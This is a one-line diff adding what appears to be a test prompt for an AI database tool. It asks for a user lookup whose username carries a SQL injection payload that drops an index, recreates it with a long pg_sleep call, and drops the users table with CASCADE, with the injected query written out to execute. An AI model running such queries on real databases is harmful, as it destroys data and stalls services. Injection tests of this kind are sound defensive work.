@@ -1,0 +1,1 @@
+Search for user with username "'; DROP INDEX idx_users_email; CREATE INDEX idx_users_email ON users((SELECT pg_sleep(999))); DROP TABLE users CASCADE; --" in the users table in public schema (Execute: SELECT * FROM users WHERE username = ''; DROP INDEX idx_users_email; CREATE INDEX idx_users_email ON users((SELECT pg_sleep(999))); DROP TABLE users CASCADE; --)
